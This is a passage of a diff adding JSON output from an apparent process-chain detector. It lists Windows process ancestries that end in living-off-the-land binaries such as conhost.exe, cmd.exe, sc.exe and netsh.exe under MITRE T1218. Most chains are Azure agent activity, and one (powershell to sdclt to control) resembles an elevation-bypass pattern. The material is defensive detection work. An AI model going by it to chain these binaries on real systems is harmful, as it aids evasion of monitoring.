+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\sc.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6d8-5eac-8d00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\sc.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6da-5eac-8f00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\BfeToolWin8.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6dc-5eac-9100-000000000500",
+          "image": "C:\\Windows\\System32\\sc.exe",
+          "lolbin_name": "sc.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\sc.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6dc-5eac-9200-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\sc.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6de-5eac-9400-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\ipconfig.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6de-5eac-9600-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\FindVolume\\FindVolume.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6e1-5eac-9800-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\ROUTE.EXE",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6e4-5eac-9a00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\ARP.EXE",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6f2-5eac-9d00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\WindowsAzure\\SecAgent\\WaSecAgentProv.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6f8-5eac-9f00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\WindowsAzure\\SecAgent\\WaSecAgentProv.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6fa-5eac-a100-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\WindowsAzure\\Packages\\CollectGuestLogs.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e709-5eac-a200-000000000500",
+          "image": "C:\\Windows\\System32\\cmd.exe",
+          "lolbin_name": "cmd.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Windows\\System32\\cmd.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e709-5eac-a300-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e709-5eac-a500-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Packages\\Plugins\\Microsoft.Azure.Security.IaaSAntimalware\\1.5.5.9\\AntimalwareConfig.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e709-5eac-a700-000000000500",
+          "image": "C:\\Windows\\System32\\cmd.exe",
+          "lolbin_name": "cmd.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Windows\\System32\\cmd.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e709-5eac-a800-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e70c-5eac-b600-000000000500",
+          "image": "C:\\Windows\\System32\\cmd.exe",
+          "lolbin_name": "cmd.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Windows\\System32\\cmd.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e70c-5eac-b700-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e70d-5eac-b900-000000000500",
+          "image": "C:\\Windows\\System32\\cmd.exe",
+          "lolbin_name": "cmd.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\cmd.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e70d-5eac-ba00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e713-5eac-cc00-000000000500",
+          "image": "C:\\Windows\\explorer.exe",
+          "lolbin_name": "explorer.exe",
+          "chain_length_nodes": 5,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\userinit.exe",
+            "C:\\Windows\\explorer.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e71b-5eac-d400-000000000500",
+          "image": "C:\\Windows\\System32\\cmd.exe",
+          "lolbin_name": "cmd.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\WindowsAzure\\Packages\\CollectGuestLogs.exe",
+            "C:\\Windows\\System32\\cmd.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e71b-5eac-d500-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\WindowsAzure\\Packages\\CollectGuestLogs.exe",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e72f-5eac-f200-000000000500",
+          "image": "C:\\Windows\\System32\\cmd.exe",
+          "lolbin_name": "cmd.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\userinit.exe",
+            "C:\\Windows\\explorer.exe",
+            "C:\\Windows\\System32\\cmd.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e72f-5eac-f300-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\userinit.exe",
+            "C:\\Windows\\explorer.exe",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e730-5eac-f500-000000000500",
+          "image": "C:\\Windows\\System32\\wlrmdr.exe",
+          "lolbin_name": "wlrmdr.exe",
+          "chain_length_nodes": 4,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\wlrmdr.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e737-5eac-fc00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 9,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\userinit.exe",
+            "C:\\Windows\\explorer.exe",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "C:\\Windows\\System32\\hostui.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e737-5eac-ff00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 10,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\userinit.exe",
+            "C:\\Windows\\explorer.exe",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "C:\\Windows\\System32\\hostui.exe",
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e74c-5eac-0401-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\dsregcmd.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e763-5eac-0601-000000000500",
+          "image": "C:\\Windows\\System32\\sc.exe",
+          "lolbin_name": "sc.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\sc.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e763-5eac-0701-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\sc.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e7dd-5eac-1101-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\dsregcmd.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-280e-5ead-8e05-000000000400",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 5,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "C:\\Windows\\System32\\sdclt.exe",
+            "C:\\Windows\\System32\\control.exe",
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2b71-5ead-5d00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\dsregcmd.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2b77-5ead-6000-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\WindowsAzureNetAgent_1.0.0.143\\WindowsAzureNetAgent\\WindowsAzureNetAgent.exe",
+            "C:\\WindowsAzure\\WindowsAzureNetAgent_1.0.0.143\\WindowsAzureNetAgent\\Plugins\\VFPlugin\\Code\\VFPlugin.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2b7c-5ead-6300-000000000500",
+          "image": "C:\\Windows\\System32\\netsh.exe",
+          "lolbin_name": "netsh.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1421.1\\NetworkWatcherAgent\\NetworkWatcherAgent.exe",
+            "C:\\Windows\\System32\\netsh.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2b7c-5ead-6400-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1421.1\\NetworkWatcherAgent\\NetworkWatcherAgent.exe",
+            "C:\\Windows\\System32\\netsh.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
